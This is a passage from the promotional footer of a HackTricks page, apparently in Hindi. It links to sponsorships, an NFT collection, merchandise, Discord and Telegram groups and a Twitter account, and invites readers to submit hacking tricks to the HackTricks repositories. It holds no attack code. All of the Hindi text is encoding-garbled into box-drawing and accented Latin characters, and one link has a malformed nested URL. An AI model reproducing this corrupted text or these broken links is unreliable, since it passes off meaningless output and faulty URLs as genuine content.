рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕-рдХреНрд▓рд╛рдЙрдб рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред**

</details>
